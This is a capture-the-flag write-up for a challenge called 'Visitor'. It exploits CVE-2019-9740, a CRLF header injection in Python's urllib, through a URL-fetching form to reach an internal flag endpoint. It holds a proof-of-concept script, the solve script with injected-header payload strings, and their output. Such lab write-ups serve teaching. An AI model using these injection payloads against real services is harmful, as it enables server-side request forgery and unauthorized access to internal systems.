## Visitor

# CVE-2019-9740
#### Author : Tinius


### POC CVE-2019-9740

```python
import sys
import urllib
import urllib.error
import urllib.request

host = "192.168.10.177:1234?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"
url = "http://" + host + ":1234/test/?test=a"

try:
    info = urllib.request.urlopen(url).info()
    print(info)
except urllib.error.URLError as e:
    print(e)
```

### Output:
```text

> nc -l -p 1234

GET /?a=1 HTTP/1.1
X-injected: header
TEST: 123:1234/test/?test=a HTTP/1.1
Accept-Encoding: identity
Host: 192.168.10.177:1234
User-Agent: Python-urllib/3.7
Connection: close
```

### Step 1 Starting

When visiting the website you are promted with an input field that asks for a url.
It fetches the data from the url and displays it on the website in text format, not rendering it.

### Step 2 Inspection
If you look at the python version in Dockerfile it is 3.7.3 if you google that with urllib injection you find the CVE.

Inspection the files in the backend you can see that we require a header to "autenticate".
### Step 3 Solve

```python
import requests

host = "internal_server:8090/flag HTTP/1.1\r\nsecret: SuPerSecRetPasSwOrd\r\n"
url = "http://" + host + ":8090/flag/?test=a"

print(url)

r = requests.post('http://localhost:8000', data={'url': url})

print(r.text)
```

Output:
```html
...
<pre>FLAG{test_flag}</pre>
...
```


### TIPS
Using a browser will format your input further so a script is recommended.

With browser injection will become:
```
"http://internal_server:8090/flag+HTTP/1.1\\r\\nsecret:+SuPerSecRetPasSwOrd\\r\\n:8090/flag/?test=a"
```

Correct:

```
http://internal_server:8090/flag HTTP/1.1\r\nsecret: SuPerSecRetPasSwOrd\r\n:8090/flag/?test=a
```